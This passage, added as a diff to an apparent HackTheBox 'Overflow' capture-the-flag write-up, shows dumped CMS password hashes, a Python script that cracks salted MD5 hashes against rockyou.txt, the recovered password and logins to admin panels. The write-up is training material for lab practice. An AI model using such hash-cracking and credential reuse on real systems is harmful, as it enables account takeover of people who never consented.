@@ -354,3 +354,76 @@ Table: userlog
 +----+----------+-----------+
 ```
 
+We find some more user hashes in `overflow` and `cmsmsdb`.
+
+```
+Database: Overflow
+Table: users
+[1 entry]
++----------------------------------+----------+
+| password                         | username |
++----------------------------------+----------+
+| c71d60439ed5590b3c5e99d95ed48165 | admin    |
++----------------------------------+----------+
+```
+
+These are most likely the login users for the CMS.
+
+```
+Database: cmsmsdb
+Table: cms_users
+[2 entries]
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+| user_id | email              | active | password                         | username | last_name | first_name | create_date         | admin_access | modified_date       |
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+| 1       | admin@overflow.htb | 1      | c6c6b9310e0e6f3eb3ffeb2baff12fdd | admin    | <blank>   | <blank>    | 2021-05-24 21:18:35 | 1            | 2021-05-26 14:49:15 |
+| 3       | <blank>            | 1      | e3d748d58b58657bfa4dffe2def0b1c7 | editor   | <blank>   | editor     | 2021-05-25 06:38:33 | 1            | 2021-05-26 04:13:58 |
++---------+--------------------+--------+----------------------------------+----------+-----------+------------+---------------------+--------------+---------------------+
+```
+
+Considering this are hashes for CMS users, we may be able to crack them with a custom python script available by 0xdf and others.
+
+```python
+#!/usr/bin/env python3    
+    
+import hashlib     
+import sys    
+                                                          
+                                                            
+hashes = {"c6c6b9310e0e6f3eb3ffeb2baff12fdd": "admin",     
+          "e3d748d58b58657bfa4dffe2def0b1c7": "editor"}     
+sitemask = b"6c2d17f37e226486"                           
+                                  
+with open(sys.argv[1], 'rb') as wordlist:    
+    for word in wordlist:                    
+        word = word.strip()                                                   
+        h = hashlib.md5(sitemask + word).hexdigest()              
+        if h in hashes:                                         
+            print(f'Password for {hashes[h]}: {word.decode()}') 
+```
+
+It will remove the trailing whitespace, hash the sitemask and the word and check if the hash is one of those we are looking for. We will use the pre-installed rockyou.txt for this.
+
+```
+oxdf@hacky$ time python crack.py /usr/share/wordlists/rockyou.txt 
+Password for editor: alpha!@#$%bravo
+
+real    0m7.250s
+user    0m7.241s
+sys     0m0.009s
+```
+
+Jackpot. The password for the 'editor' user works, and we can log into the admin console.
+
+![CMSAdmin](https://i.imgur.com/nj45tSh.png)
+
+From there we start to enumerate through the options and find this login mask at `devbuild-job.overflow.htb`. 
+
+![devbuild](https://i.imgur.com/r6CAcqJ.png)
+
+Fortunately, the editor and the password works here again, just like in the admin panel earlier.
+
+![devbuildadmin](https://i.imgur.com/2AUKcxX.png)
+
+A lot of buttons and links again, but there is one that stands out in an interesting way. It is a button to upload some kind of resume. Apparentlu the form allows .tiff, .jpeg, and .jpg format.
+
